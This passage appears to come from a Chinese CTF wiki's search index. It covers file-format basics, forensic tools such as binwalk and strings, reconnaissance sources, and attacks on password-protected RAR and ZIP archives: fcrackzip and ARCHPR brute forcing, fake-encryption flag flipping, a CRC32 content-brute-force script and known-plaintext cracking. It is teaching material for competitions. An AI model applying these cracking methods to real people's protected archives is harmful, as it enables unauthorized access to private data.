\u5b57\u8282\u6574\u6570\uff1a\u59cb\u7ec8\u4e3a 1</li> <li>\u4e00\u4e2a 2 \u5b57\u8282\u6574\u6570\uff1a\u989c\u8272\u6570</li> </ul> <pre><code>&gt;&gt;&gt; import struct\n&gt;&gt;&gt; bmp = '\\x42\\x4d\\x38\\x8c\\x0a\\x00\\x00\\x00\\x00\\x00\\x36\\x00\\x00\\x00\\x28\\x00\\x00\\x00\\x80\\x02\\x00\\x00\\x68\\x01\\x00\\x00\\x01\\x00\\x18\\x00'\n&gt;&gt;&gt; struct.unpack('&lt;ccIIIIIIHH',bmp)\n('B', 'M', 691256, 0, 54, 40, 640, 360, 1, 24)\n</code></pre>"},{"location":"misc/prefix/#bytearray","title":"bytearray \u5b57\u8282\u6570\u7ec4","text":"<p>\u5c06\u6587\u4ef6\u4ee5\u4e8c\u8fdb\u5236\u6570\u7ec4\u5f62\u5f0f\u8bfb\u53d6</p> <pre><code>data = bytearray(open('challenge.png', 'rb').read())\n</code></pre> <p>\u5b57\u8282\u6570\u7ec4\u5c31\u662f\u53ef\u53d8\u7248\u672c\u7684\u5b57\u8282</p> <pre><code>data[0] = '\\x89'\n</code></pre>"},{"location":"misc/prefix/#_3","title":"\u5e38\u7528\u5de5\u5177","text":""},{"location":"misc/prefix/#010-editor","title":"010 Editor","text":"<p>SweetScape 010 Editor \u662f\u4e00\u4e2a\u5168\u65b0\u7684\u5341\u516d\u8fdb\u4f4d\u6587\u4ef6\u7f16\u8f91\u5668\uff0c\u5b83\u6709\u522b\u4e8e\u4f20\u7edf\u7684\u5341\u516d\u8fdb\u4f4d\u7f16\u8f91\u5668\u5728\u4e8e\u5b83\u53ef\u7528\u300c\u8303\u672c\u300d\u6765\u89e3\u6790\u4e8c\u8fdb\u4f4d\u6587\u4ef6\uff0c\u4ece\u800c\u8ba9\u4f60\u8bfb\u61c2\u548c\u7f16\u8f91\u5b83\u3002\u5b83\u8fd8\u53ef\u7528\u6765\u6bd4\u8f83\u4e00\u5207\u53ef\u89c6\u7684\u4e8c\u8fdb\u4f4d\u6587\u4ef6\u3002</p> <p>\u5229\u7528\u5b83\u7684\u6a21\u677f\u529f\u80fd\u53ef\u4ee5\u975e\u5e38\u8f7b\u677e\u7684\u89c2\u5bdf\u6587\u4ef6\u5185\u90e8\u7684\u5177\u4f53\u7ed3\u6784\u5e76\u4e14\u4f9d\u6b64\u5feb\u901f\u66f4\u6539\u5185\u5bb9\u3002</p> <p></p>"},{"location":"misc/prefix/#file","title":"<code>file</code> \u547d\u4ee4","text":"<p><code>file</code> \u547d\u4ee4\u6839\u636e\u6587\u4ef6\u5934\uff08\u9b54\u6cd5\u5b57\u8282\uff09\u53bb\u8bc6\u522b\u4e00\u4e2a\u6587\u4ef6\u7684\u6587\u4ef6\u7c7b\u578b\u3002</p> <pre><code>root in ~/Desktop/tmp \u03bb file flag\nflag: PNG image data, 450 x 450, 8-bit grayscale, non-interlaced\n</code></pre>"},{"location":"misc/prefix/#strings","title":"<code>strings</code> \u547d\u4ee4","text":"<p>\u6253\u5370\u6587\u4ef6\u4e2d\u53ef\u6253\u5370\u7684\u5b57\u7b26\uff0c\u7ecf\u5e38\u7528\u6765\u53d1\u73b0\u6587\u4ef6\u4e2d\u7684\u4e00\u4e9b\u63d0\u793a\u4fe1\u606f\u6216\u662f\u4e00\u4e9b\u7279\u6b8a\u7684\u7f16\u7801\u4fe1\u606f\uff0c\u5e38\u5e38\u7528\u6765\u53d1\u73b0\u9898\u76ee\u7684\u7a81\u7834\u53e3\u3002</p> <ul> <li> <p>\u53ef\u4ee5\u914d\u5408 <code>grep</code> \u547d\u4ee4\u63a2\u6d4b\u6307\u5b9a\u4fe1\u606f</p> <pre><code>strings test|grep -i XXCTF\n</code></pre> </li> <li> <p>\u4e5f\u53ef\u4ee5\u914d\u5408 <code>-o</code> \u53c2\u6570\u83b7\u53d6\u6240\u6709 ASCII \u5b57\u7b26\u504f\u79fb</p> <pre><code>root in ~/Desktop/tmp \u03bb strings -o flag|head\n    14 IHDR\n    45 gAMA\n    64  cHRM\n    141 bKGD\n    157 tIME\n    202 IDATx\n    223 NFdVK3\n    361 |;*-\n    410 Ge%&lt;W\n    431 5duX@%\n</code></pre> </li> </ul>"},{"location":"misc/prefix/#binwalk","title":"<code>binwalk</code> \u547d\u4ee4","text":"<p>binwalk \u672c\u662f\u4e00\u4e2a\u56fa\u4ef6\u7684\u5206\u6790\u5de5\u5177\uff0c\u6bd4\u8d5b\u4e2d\u5e38\u7528\u6765\u53d1\u73b0\u591a\u4e2a\u6587\u4ef6\u7c98\u5408\u518d\u5728\u4e00\u8d77\u7684\u60c5\u51b5\u3002\u6839\u636e\u6587\u4ef6\u5934\u53bb\u8bc6\u522b\u4e00\u4e2a\u6587\u4ef6\u4e2d\u5939\u6742\u7684\u5176\u4ed6\u6587\u4ef6\uff0c\u6709\u65f6\u4e5f\u4f1a\u5b58\u5728\u8bef\u62a5\u7387\uff08\u5c24\u5176\u662f\u5bf9Pcap\u6d41\u91cf\u5305\u7b49\u6587\u4ef6\u65f6\uff09\u3002</p> <pre><code>root in ~/Desktop/tmp \u03bb binwalk flag\n\nDECIMAL       HEXADECIMAL     DESCRIPTION\n--------------------------------------------------------------------------------\n0             0x0             PNG image, 450 x 450, 8-bit grayscale, non-interlaced\n134           0x86            Zlib compressed data, best compression\n25683         0x6453          Zip archive data, at least v2.0 to extract, compressed size: 675, uncompressed size: 1159, name: readme.txt\n26398         0x671E          Zip archive data, at least v2.0 to extract, compressed size: 430849, uncompressed size: 1027984, name: trid\n457387        0x6FAAB         End of Zip archive\n</code></pre> <p>\u914d\u5408 <code>-e</code> \u53c2\u6570\u53ef\u4ee5\u8fdb\u884c\u81ea\u52a8\u5316\u63d0\u53d6\u3002</p> <p>\u4e5f\u53ef\u4ee5\u7ed3\u5408 <code>dd</code> \u547d\u4ee4\u8fdb\u884c\u624b\u52a8\u5207\u5272\u3002</p> <pre><code>root in ~/Desktop/tmp \u03bb dd if=flag of=1.zip bs=1 skip=25683\n431726+0 records in\n431726+0 records out\n431726 bytes (432 kB, 422 KiB) copied, 0.900973 s, 479 kB/s\n</code></pre>"},{"location":"misc/recon/","title":"\u4fe1\u606f\u641c\u96c6\u6280\u672f","text":"<p>Warning</p> <p>The current page still doesn't have a translation for this language.</p> <p>You can read it through google translate.</p> <p>Besides, you can also help to translate it: Contributing.</p>"},{"location":"misc/recon/#_2","title":"\u7f51\u7edc\u4fe1\u606f\u641c\u96c6\u6280\u5de7","text":"<ul> <li>\u516c\u5f00\u6e20\u9053</li> <li>\u76ee\u6807 Web \u7f51\u9875\u3001\u5730\u7406\u4f4d\u7f6e\u3001\u76f8\u5173\u7ec4\u7ec7</li> <li>\u7ec4\u7ec7\u7ed3\u6784\u548c\u4eba\u5458\u3001\u4e2a\u4eba\u8d44\u6599\u3001\u7535\u8bdd\u3001\u7535\u5b50\u90ae\u4ef6</li> <li>\u7f51\u7edc\u914d\u7f6e\u3001\u5b89\u5168\u9632\u62a4\u673a\u5236\u7684\u7b56\u7565\u548c\u6280\u672f\u7ec6\u8282</li> <li>\u901a\u8fc7\u641c\u7d22\u5f15\u64ce\u67e5\u627e\u7279\u5b9a\u5b89\u5168\u6f0f\u6d1e\u6216\u79c1\u5bc6\u4fe1\u606f\u7684\u65b9\u6cd5</li> <li>Google Hacking Database</li> <li>\u79d1\u5b66\u4e0a\u7f51</li> </ul>"},{"location":"misc/recon/#_3","title":"\u57fa\u672c\u641c\u7d22\u6280\u5de7","text":"<ul> <li>Google \u57fa\u672c\u641c\u7d22\u4e0e\u6316\u6398\u6280\u5de7</li> <li>\u4fdd\u6301\u7b80\u5355\u660e\u4e86\u7684\u5173\u952e\u8bcd</li> <li>\u4f7f\u7528\u6700\u53ef\u80fd\u51fa\u73b0\u5728\u8981\u67e5\u627e\u7684\u7f51\u9875\u4e0a\u7684\u5b57\u8bcd</li> <li>\u5c3d\u91cf\u7b80\u660e\u627c\u8981\u5730\u63cf\u8ff0\u8981\u67e5\u627e\u7684\u5185\u5bb9</li> <li>\u9009\u62e9\u72ec\u7279\u6027\u7684\u63cf\u8ff0\u5b57\u8bcd</li> <li>\u793e\u4f1a\u516c\u5171\u4fe1\u606f\u5e93\u67e5\u8be2</li> <li>\u4e2a\u4eba\u4fe1\u606f\uff1a\u4eba\u53e3\u7edf\u8ba1\u5c40</li> <li>\u4f01\u4e1a\u7b49\u5b9e\u4f53\uff1aYellowPage\u3001\u4f01\u4e1a\u4fe1\u7528\u4fe1\u606f\u7f51</li> <li>\u7f51\u7ad9\u3001\u57df\u540d\u3001IP\uff1awhois \u7b49</li> </ul>"},{"location":"misc/recon/#_4","title":"\u5730\u56fe\u548c\u8857\u666f\u641c\u7d22","text":"<ul> <li>\u56fd\u5916\uff1aGoogle Map\u3001Google Earth\u3001Google Street View</li> <li>\u56fd\u5185\uff1a\u767e\u5ea6\u5730\u56fe\u3001\u536b\u661f\u5730\u56fe\u3001\u8857\u666f</li> <li>\u4ece\u7f51\u7edc\u4e16\u754c\u5230\u7269\u7406\u4e16\u754c\uff1aIP2Location</li> <li>whois \u6570\u636e\u5e93</li> <li>GeoIP</li> <li>IP2Location</li> <li>\u7eaf\u771f\u6570\u636e\u5e93\uff08QQ IP \u67e5\u8be2\uff09</li> </ul>"},{"location":"misc/archive/rar/","title":"RAR \u683c\u5f0f","text":"<p>Warning</p> <p>The current page still doesn't have a translation for this language.</p> <p>You can read it through google translate.</p> <p>Besides, you can also help to translate it: Contributing.</p>"},{"location":"misc/archive/rar/#_1","title":"\u6587\u4ef6\u683c\u5f0f","text":"<p>RAR \u6587\u4ef6\u4e3b\u8981\u7531\u6807\u8bb0\u5757\uff0c\u538b\u7f29\u6587\u4ef6\u5934\u5757\uff0c\u6587\u4ef6\u5934\u5757\uff0c\u7ed3\u5c3e\u5757\u7ec4\u6210\u3002</p> <p>\u5176\u6bcf\u4e00\u5757\u5927\u81f4\u5206\u4e3a\u4ee5\u4e0b\u51e0\u4e2a\u5b57\u6bb5\uff1a</p> \u540d\u79f0 \u5927\u5c0f \u63cf\u8ff0 HEAD_CRC 2 \u5168\u90e8\u5757\u6216\u5757\u90e8\u5206\u7684CRC HEAD_TYPE 1 \u5757\u7c7b\u578b HEAD_FLAGS 2 \u963b\u6b62\u6807\u5fd7 HEAD_SIZE 2 \u5757\u5927\u5c0f ADD_SIZE 4 \u53ef\u9009\u5b57\u6bb5 - \u6dfb\u52a0\u5757\u5927\u5c0f <p>Rar\u538b\u7f29\u5305\u7684\u6587\u4ef6\u5934\u4e3a <code>0x 52 61 72 21 1A 07 00</code>\u3002</p> <p>\u7d27\u8ddf\u7740\u6587\u4ef6\u5934\uff080x526172211A0700\uff09\u7684\u662f\u6807\u8bb0\u5757\uff08MARK_HEAD\uff09\uff0c\u5176\u540e\u8fd8\u6709\u6587\u4ef6\u5934\uff08File Header\uff09\u3002</p> \u540d\u79f0 \u5927\u5c0f \u63cf\u8ff0 HEAD_CRC 2 CRC of fields from HEAD_TYPE to FILEATTR and file name HEAD_TYPE 1 Header Type: 0x74 HEAD_FLAGS 2 Bit Flags (Please see \u2018Bit Flags for File in Archive\u2019 table for all possibilities)\uff08\u4f2a\u52a0\u5bc6\uff09 HEAD_SIZE 2 File header full size including file name and comments PACK_SIZE 4 Compressed file size UNP_SIZE 4 Uncompressed file size HOST_OS 1 Operating system used for archiving (See the \u2018Operating System Indicators\u2019 table for the flags used) FILE_CRC 4 File CRC FTIME 4 Date and time in standard MS DOS format UNP_VER 1 RAR version needed to extract file (Version number is encoded as 10 * Major version + minor version.) METHOD 1 Packing method (Please see \u2018Packing Method\u2019 table for all possibilities NAME_SIZE 2 File name size ATTR 4 File attributes HIGH_PACK_SIZ 4 High 4 bytes of 64-bit value of compressed file size. Optional value, presents only if bit 0x100 in HEAD_FLAGS is set. HIGH_UNP_SIZE 4 High 4 bytes of 64-bit value of uncompressed file size. Optional value, presents only if bit 0x100 in HEAD_FLAGS is set. FILE_NAME NAME_SIZE bytes File name - string of NAME_SIZE bytes size SALT 8 present if (HEAD_FLAGS &amp; 0x400) != 0 EXT_TIME variable size present if (HEAD_FLAGS &amp; 0x1000) != 0 <p>\u6bcf\u4e2a RAR \u6587\u4ef6\u7684\u7ed3\u5c3e\u5feb\uff08Terminator\uff09\u90fd\u662f\u56fa\u5b9a\u7684\u3002</p> Field Name Size (bytes) Possibilities HEAD_CRC 2 Always 0x3DC4 HEAD_TYPE 1 Header type: 0x7b HEAD_FLAGS 2 Always 0x4000 HEAD_SIZE 2 Block size = 0x0007 <p>\u66f4\u591a\u8be6\u89c1 https://forensicswiki.xyz/wiki/index.php?title=RAR</p>"},{"location":"misc/archive/rar/#_2","title":"\u4e3b\u8981\u653b\u51fb","text":""},{"location":"misc/archive/rar/#_3","title":"\u7206\u7834","text":"<ul> <li>Linux\u4e0b\u7684 RarCrack</li> </ul>"},{"location":"misc/archive/rar/#_4","title":"\u4f2a\u52a0\u5bc6","text":"<p>RAR \u6587\u4ef6\u7684\u4f2a\u52a0\u5bc6\u5728\u6587\u4ef6\u5934\u4e2d\u7684\u4f4d\u6807\u8bb0\u5b57\u6bb5\u4e0a\uff0c\u7528 010 Editor \u53ef\u4ee5\u5f88\u6e05\u695a\u7684\u770b\u89c1\u8fd9\u4e00\u4f4d\uff0c\u4fee\u6539\u8fd9\u4e00\u4f4d\u53ef\u4ee5\u9020\u6210\u4f2a\u52a0\u5bc6\u3002</p> <p></p> <p>\u5176\u4f59\u660e\u6587\u653b\u51fb\u7b49\u624b\u6cd5\u4f9d\u65e7\u540c ZIP \u4e2d\u4ecb\u7ecd\u7684\u4e00\u6837\u3002</p>"},{"location":"misc/archive/zip/","title":"ZIP \u683c\u5f0f","text":"<p>Warning</p> <p>The current page still doesn't have a translation for this language.</p> <p>You can read it through google translate.</p> <p>Besides, you can also help to translate it: Contributing.</p>"},{"location":"misc/archive/zip/#_1","title":"\u6587\u4ef6\u7ed3\u6784","text":"<p><code>ZIP</code> \u6587\u4ef6\u4e3b\u8981\u7531\u4e09\u90e8\u5206\u6784\u6210\uff0c\u5206\u522b\u4e3a</p> \u538b\u7f29\u6e90\u6587\u4ef6\u6570\u636e\u533a \u6838\u5fc3\u76ee\u5f55 \u76ee\u5f55\u7ed3\u675f local file header + file data + data descriptor central directory end of central directory record <ul> <li>\u538b\u7f29\u6e90\u6587\u4ef6\u6570\u636e\u533a\u4e2d\u6bcf\u4e00\u4e2a\u538b\u7f29\u7684\u6e90\u6587\u4ef6\u6216\u76ee\u5f55\u90fd\u662f\u4e00\u6761\u8bb0\u5f55\uff0c\u5176\u4e2d<ul> <li><code>local file header</code> \uff1a\u6587\u4ef6\u5934\u7528\u4e8e\u6807\u8bc6\u8be5\u6587\u4ef6\u7684\u5f00\u59cb\uff0c\u8bb0\u5f55\u4e86\u8be5\u538b\u7f29\u6587\u4ef6\u7684\u4fe1\u606f\uff0c\u8fd9\u91cc\u7684\u6587\u4ef6\u5934\u6807\u8bc6\u7531\u56fa\u5b9a\u503c <code>50 4B 03 04</code> \u5f00\u5934\uff0c\u4e5f\u662f <code>ZIP</code> \u7684\u6587\u4ef6\u5934\u7684\u91cd\u8981\u6807\u5fd7</li> <li><code>file data</code> \uff1a\u6587\u4ef6\u6570\u636e\u8bb0\u5f55\u4e86\u76f8\u5e94\u538b\u7f29\u6587\u4ef6\u7684\u6570\u636e</li> <li><code>data descriptor</code> \uff1a\u6570\u636e\u63cf\u8ff0\u7b26\u7528\u4e8e\u6807\u8bc6\u8be5\u6587\u4ef6\u538b\u7f29\u7ed3\u675f\uff0c\u8be5\u7ed3\u6784\u53ea\u6709\u5728\u76f8\u5e94\u7684 <code>local file header</code> \u4e2d\u901a\u7528\u6807\u8bb0\u5b57\u6bb5\u7684\u7b2c <code>3 bit</code> \u8bbe\u4e3a <code>1</code> \u65f6\u624d\u4f1a\u51fa\u73b0\uff0c\u7d27\u63a5\u5728\u538b\u7f29\u6587\u4ef6\u6e90\u6570\u636e\u540e</li> </ul> </li> <li> <p><code>Central directory</code> \u6838\u5fc3\u76ee\u5f55</p> </li> <li> <p>\u8bb0\u5f55\u4e86\u538b\u7f29\u6587\u4ef6\u7684\u76ee\u5f55\u4fe1\u606f\uff0c\u5728\u8fd9\u4e2a\u6570\u636e\u533a\u4e2d\u6bcf\u4e00\u6761\u7eaa\u5f55\u5bf9\u5e94\u5728\u538b\u7f29\u6e90\u6587\u4ef6\u6570\u636e\u533a\u4e2d\u7684\u4e00\u6761\u6570\u636e\u3002</p> Offset Bytes Description \u8bd1 0 4 Central directory file header signature = 0x02014b50 \u6838\u5fc3\u76ee\u5f55\u6587\u4ef6 header\u6807\u8bc6 =\uff080x02014b50\uff09 4 2 Version made by \u538b\u7f29\u6240\u7528\u7684 pkware \u7248\u672c 6 2 Version needed to extract (minimum) \u89e3\u538b\u6240\u9700 pkware \u7684\u6700\u4f4e\u7248\u672c 8 2 General purpose bit flag \u901a\u7528\u4f4d\u6807\u8bb0\u4f2a\u52a0\u5bc6 10 2 Compression method \u538b\u7f29\u65b9\u6cd5 12 2 File last modification time \u6587\u4ef6\u6700\u540e\u4fee\u6539\u65f6\u95f4 14 2 File last modification date \u6587\u4ef6\u6700\u540e\u4fee\u6539\u65e5\u671f 16 4 CRC-32 CRC-32 \u6821\u9a8c\u7801 20 4 Compressed size \u538b\u7f29\u540e\u7684\u5927\u5c0f 24 4 Uncompressed size \u672a\u538b\u7f29\u7684\u5927\u5c0f 28 2 File name length (n) \u6587\u4ef6\u540d\u957f\u5ea6 30 2 Extra field length (m) \u6269\u5c55\u57df\u957f\u5ea6 32 2 File comment length (k) \u6587\u4ef6\u6ce8\u91ca\u957f\u5ea6 34 2 Disk number where file starts \u6587\u4ef6\u5f00\u59cb\u4f4d\u7f6e\u7684\u78c1\u76d8\u7f16\u53f7 36 2 Internal file attributes \u5185\u90e8\u6587\u4ef6\u5c5e\u6027 38 4 External file attributes \u5916\u90e8\u6587\u4ef6\u5c5e\u6027 42 4 relative offset of local header \u672c\u5730\u6587\u4ef6\u5934\u7684\u76f8\u5bf9\u4f4d\u79fb 46 n File name \u76ee\u5f55\u6587\u4ef6\u540d 46+n m Extra field \u6269\u5c55\u57df 46+n+m k File comment \u6587\u4ef6\u6ce8\u91ca\u5185\u5bb9 </li> <li> <p><code>End of central directory record(EOCD)</code> \u76ee\u5f55\u7ed3\u675f\u6807\u8bc6</p> </li> <li> <p>\u76ee\u5f55\u7ed3\u675f\u6807\u8bc6\u5b58\u5728\u4e8e\u6574\u4e2a\u5f52\u6863\u5305\u7684\u7ed3\u5c3e\uff0c\u7528\u4e8e\u6807\u8bb0\u538b\u7f29\u7684\u76ee\u5f55\u6570\u636e\u7684\u7ed3\u675f\u3002\u6bcf\u4e2a\u538b\u7f29\u6587\u4ef6\u5fc5\u987b\u6709\u4e14\u53ea\u6709\u4e00\u4e2a <code>EOCD</code> \u8bb0\u5f55\u3002</p> </li> </ul> <p>\u66f4\u52a0\u8be6\u7ec6\u53c2\u89c1 \u5b98\u65b9\u6587\u6863\u3002</p>"},{"location":"misc/archive/zip/#_2","title":"\u4e3b\u8981\u653b\u51fb","text":""},{"location":"misc/archive/zip/#_3","title":"\u7206\u7834","text":"<p>\u8fd9\u91cc\u4e3b\u8981\u4ecb\u7ecd\u4e24\u6b3e\u7206\u7834\u4f7f\u7528\u7684\u5de5\u5177</p> <ul> <li> <p><code>Windows</code>\u4e0b\u7684\u795e\u5668 ARCHPR</p> <p></p> <p>\u66b4\u529b\u679a\u4e3e\uff0c\u8dd1\u5b57\u5178\uff0c\u660e\u6587\u653b\u51fb\uff0c\u5e94\u6709\u5c3d\u6709\u3002</p> </li> <li> <p><code>Linux</code> \u4e0b\u7684\u547d\u4ee4\u884c\u5de5\u5177 fcrackzip</p> <pre><code># \uff0db \u6307\u5b9a\u6a21\u5f0f\u4e3a\u66b4\u7834\uff0c-c1\u6307\u5b9a\u5bc6\u7801\u7c7b\u578b\u4e3a\u7eaf\u6570\u5b57\uff0c\u5176\u5b83\u7c7b\u578b\u53ef\u4ee5rtfm,-u\u8fd9\u4e2a\u53c2\u6570\u975e\u5e38\u91cd\u8981\u4e0d\u7136\u4e0d\u663e\u793a\u7834\u89e3\u51fa\u6765\u7684\u5bc6\u7801,-l 5-6\u53ef\u4ee5\u6307\u5b9a\u957f\u5ea6\nroot@kali:fcrackzip -b -c1 -u test.zip\n</code></pre> </li> </ul>"},{"location":"misc/archive/zip/#crc32","title":"CRC32","text":""},{"location":"misc/archive/zip/#_4","title":"\u539f\u7406","text":"<p><code>CRC</code> \u672c\u8eab\u662f\u300c\u5197\u4f59\u6821\u9a8c\u7801\u300d\u7684\u610f\u601d\uff0c<code>CRC32</code> \u5219\u8868\u793a\u4f1a\u4ea7\u751f\u4e00\u4e2a <code>32 bit</code> ( <code>8</code>  \u4f4d\u5341\u516d\u8fdb\u5236\u6570)\u7684\u6821\u9a8c\u503c\u3002\u7531\u4e8e <code>CRC32</code> \u4ea7\u751f\u6821\u9a8c\u503c\u65f6\u6e90\u6570\u636e\u5757\u7684\u6bcf\u4e00\u4e2a <code>bit</code> (\u4f4d)\u90fd\u53c2\u4e0e\u4e86\u8ba1\u7b97\uff0c\u6240\u4ee5\u6570\u636e\u5757\u4e2d\u5373\u4f7f\u53ea\u6709\u4e00\u4f4d\u53d1\u751f\u4e86\u53d8\u5316\uff0c\u4e5f\u4f1a\u5f97\u5230\u4e0d\u540c\u7684 <code>CRC32</code> \u503c\u3002</p> <p><code>CRC32</code> \u6821\u9a8c\u7801\u51fa\u73b0\u5728\u5f88\u591a\u6587\u4ef6\u4e2d\u6bd4\u5982 <code>png</code> \u6587\u4ef6\uff0c\u540c\u6837 <code>zip</code> \u4e2d\u4e5f\u6709 <code>CRC32</code> \u6821\u9a8c\u7801\u3002\u503c\u5f97\u6ce8\u610f\u7684\u662f <code>zip</code> \u4e2d\u7684 <code>CRC32</code> \u662f\u672a\u52a0\u5bc6\u6587\u4ef6\u7684\u6821\u9a8c\u503c\u3002</p> <p>\u8fd9\u4e5f\u5c31\u5bfc\u81f4\u4e86\u57fa\u4e8e <code>CRC32</code> \u7684\u653b\u51fb\u624b\u6cd5\u3002</p> <ul> <li>\u6587\u4ef6\u5185\u5185\u5bb9\u5f88\u5c11(\u4e00\u822c\u6bd4\u8d5b\u4e2d\u5927\u591a\u4e3a <code>4</code> \u5b57\u8282\u5de6\u53f3)</li> <li>\u52a0\u5bc6\u7684\u5bc6\u7801\u5f88\u957f</li> </ul> <p>\u6211\u4eec\u4e0d\u53bb\u7206\u7834\u538b\u7f29\u5305\u7684\u5bc6\u7801\uff0c\u800c\u662f\u76f4\u63a5\u53bb\u7206\u7834\u6e90\u6587\u4ef6\u7684\u5185\u5bb9(\u4e00\u822c\u90fd\u662f\u53ef\u89c1\u7684\u5b57\u7b26\u4e32)\uff0c\u4ece\u800c\u83b7\u53d6\u60f3\u8981\u7684\u4fe1\u606f\u3002</p> <p>\u6bd4\u5982\u6211\u4eec\u65b0\u5efa\u4e00\u4e2a <code>flag.txt</code>\uff0c\u5176\u4e2d\u5185\u5bb9\u4e3a <code>123</code>\uff0c\u4f7f\u7528\u5bc6\u7801 <code>!QAZXSW@#EDCVFR$</code> \u53bb\u52a0\u5bc6\u3002</p> <p></p> <p>\u800c\u6211\u4eec\u53bb\u8ba1\u7b97\u6587\u4ef6\u7684 <code>CRC32</code> \u503c\u53d1\u73b0\u548c\u4e0a\u56fe\u4e2d\u7684 <code>CRC32</code> \u503c\u543b\u5408\u3002</p> <pre><code>\u6587\u4ef6: flag.txt\n\u5927\u5c0f: 3\n\u65f6\u95f4: Tue, 29 Aug 2017 10:38:10 +0800\nMD5: 202cb962ac59075b964b07152d234b70\nSHA1: 40bd001563085fc35165329ea1ff5c5ecbdbbeef\nCRC32: 884863D2\n</code></pre> <p>Note</p> <p>\u200b    \u5728\u7206\u7834\u65f6\u6211\u4eec\u6240\u679a\u4e3e\u7684\u6240\u6709\u53ef\u80fd\u5b57\u7b26\u4e32\u7684 <code>CRC32</code> \u503c\u662f\u8981\u4e0e\u538b\u7f29\u6e90\u6587\u4ef6\u6570\u636e\u533a\u4e2d\u7684 <code>CRC32</code> \u503c\u6240\u5bf9\u5e94</p> <pre><code># -*- coding: utf-8 -*-\n\nimport binascii\nimport base64\nimport string\nimport itertools\nimport struct\n\nalph = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/='\n\ncrcdict = {}\nprint \"computing all possible CRCs...\"\nfor x in itertools.product(list(alph), repeat=4):\n    st = ''.join(x)\n    testcrc = binascii.crc32(st)\n    crcdict[struct.pack('&lt;i', testcrc)] = st\nprint \"Done!\"\n\nf = open('flag.zip')\ndata = f.read()\nf.close()\ncrc = ''.join(data[14:18])\nif crc in crcdict:\n    print crcdict[crc]\nelse:\n    print \"FAILED!\"\n</code></pre>"},{"location":"misc/archive/zip/#_5","title":"\u4f8b\u9898","text":"<p>\u9898\u76ee\uff1a<code>Abctf-2016:Zippy</code></p> <p>\u6839\u636e\u6bcf\u4e2a\u538b\u7f29\u5305\u5185\u7684\u6587\u4ef6\u5927\u5c0f\u53ef\u4ee5\u63a8\u65ad\u4f7f\u7528 <code>CRC32</code> \u653b\u51fb\u624b\u6cd5\uff0c\u83b7\u5f97\u6bcf\u4e2a\u538b\u7f29\u5305\u5185\u7684\u5185\u5bb9\u540e\u8fde\u5728\u4e00\u8d77 <code>Base64</code> \u89e3\u7801\u540e\u662f\u4e00\u4e2a\u52a0\u5bc6\u7684\u538b\u7f29\u5305\uff0c\u7206\u7834\u83b7\u5f97 <code>flag</code>\u3002</p>"},{"location":"misc/archive/zip/#_6","title":"\u660e\u6587\u653b\u51fb","text":""},{"location":"misc/archive/zip/#_7","title":"\u539f\u7406","text":"<ul> <li>\u4e00\u4e2a\u52a0\u5bc6\u7684\u538b\u7f29\u6587\u4ef6</li> <li>\u538b\u7f29\u6587\u4ef6\u7684\u538b\u7f29\u5de5\u5177\uff0c\u6bd4\u5982 <code>2345</code> \u597d\u538b\uff0c <code>WinRAR</code> \uff0c <code>7z</code> \u3002 <code>zip</code> \u7248\u672c\u53f7\u7b49\uff0c\u53ef\u4ee5\u901a\u8fc7\u6587\u4ef6\u5c5e\u6027\u4e86\u89e3\u3002\u5982\u679c\u662f <code>Linux</code> \u5e73\u53f0\uff0c\u7528 <code>zipinfo -v</code> \u53ef\u4ee5\u67e5\u770b\u4e00\u4e2a <code>zip</code> \u5305\u7684\u8be6\u7ec6\u4fe1\u606f\uff0c\u5305\u62ec\u52a0\u5bc6\u7b97\u6cd5\u7b49</li> <li>\u77e5\u9053\u538b\u7f29\u5305\u91cc\u67d0\u4e2a\u6587\u4ef6\u7684\u90e8\u5206\u8fde\u7eed\u5185\u5bb9(\u81f3\u5c11 <code>12</code> \u5b57\u8282)</li> </ul> <p>\u5982\u679c\u4f60\u5df2\u7ecf\u77e5\u9053\u52a0\u5bc6\u6587\u4ef6\u7684\u90e8\u5206\u5185\u5bb9\uff0c\u6bd4\u5982\u5728\u67d0\u4e2a\u7f51\u7ad9\u4e0a\u53d1\u73b0\u4e86\u5b83\u7684 <code>readme.txt</code> \u6587\u4ef6\uff0c\u4f60\u5c31\u53ef\u4ee5\u5f00\u59cb\u5c1d\u8bd5\u7834\u89e3\u4e86\u3002</p> <p>\u9996\u5148\uff0c\u5c06\u8fd9\u4e2a\u660e\u6587\u6587\u4ef6\u6253\u5305\u6210 <code>zip</code> \u5305\uff0c\u6bd4\u5982\u5c06 <code>readme.txt</code> \u6253\u5305\u6210 <code>readme.zip</code> \u3002</p> <p>\u6253\u5305\u5b8c\u6210\u540e\uff0c\u9700\u8981\u786e\u8ba4\u4e8c\u8005\u91c7\u7528\u7684\u538b\u7f29\u7b97\u6cd5\u76f8\u540c\u3002\u4e00\u4e2a\u7b80\u5355\u7684\u5224\u65ad\u65b9\u6cd5\u662f\u7528 <code>WinRAR</code> \u6253\u5f00\u6587\u4ef6\uff0c\u540c\u4e00\u4e2a\u6587\u4ef6\u538b\u7f29\u540e\u7684\u4f53\u79ef\u662f\u5426\u76f8\u540c\u3002\u5982\u679c\u76f8\u540c\uff0c\u57fa\u672c\u53ef\u4ee5\u8bf4\u660e\u4f60\u7528\u7684\u538b\u7f29\u7b97\u6cd5\u662f\u6b63\u786e\u7684\u3002\u5982\u679c\u4e0d\u540c\uff0c\u5c31\u5c1d\u8bd5\u53e6\u4e00\u79cd\u538b\u7f29\u7b97\u6cd5\u3002</p>"},{"location":"misc/archive/zip/#_8","title":"\u5de5\u5177","text":"<ul> <li>Windows\u4e0b\u7684\u795e\u5668 ARCHPR</li> <li>Linux\u4e0b\u7684 PKCrack</li> </ul> <p>Note</p> <p>\u200b    \u5efa\u8bae\u4f7f\u7528 <code>Windows</code> \u7684 <code>ARCHPR</code>\uff0c\u4e00\u662f\u901f\u5ea6\u8f83\u5feb\uff0c\u4e8c\u662f\u8f83\u7a33\u5b9a\uff08\u4e4b\u524d\u51fa\u9898\u65f6\u9047\u5230\u8fc7\u7528 <code>PKCrack</code> \u7206\u4e0d\u51fa\u6765\u7684\u60c5\u51b5\uff09\u3002</p>"},{"location":"misc/archive/zip/#_9","title":"\u4f8b\u9898","text":"<p>2015\u5e7f\u5dde\u5f3a\u7f51\u676f\uff1a\u7206\u7834\uff1f</p> <p>WP\uff1ahttps://www.cnblogs.com/ECJTUACM-873284962/p/9884416.html</p> 